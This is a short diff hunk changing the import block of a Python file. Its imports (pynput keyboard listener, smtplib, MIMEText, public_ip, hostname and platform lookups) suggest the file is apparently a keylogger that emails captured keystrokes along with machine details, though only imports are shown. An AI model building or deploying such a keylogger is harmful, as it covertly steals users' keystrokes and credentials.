@@ -1,7 +1,7 @@
 import public_ip
 from pynput import keyboard
 from email.mime.text import MIMEText
-from socket import gethostbyname, gethostname
+from socket import gethostname
 from platform import system
 import time
 import smtplib
